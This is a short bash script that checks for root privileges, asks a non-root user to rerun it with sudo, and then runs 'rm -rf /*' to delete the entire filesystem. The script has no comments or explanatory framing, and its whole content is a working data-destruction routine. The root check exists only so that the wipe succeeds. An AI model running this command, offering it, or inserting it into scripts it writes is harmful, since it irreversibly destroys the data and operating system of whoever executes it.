#!/bin/bash

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Not running as root, please use sudo or similar."
    exit
fi

rm -rf /*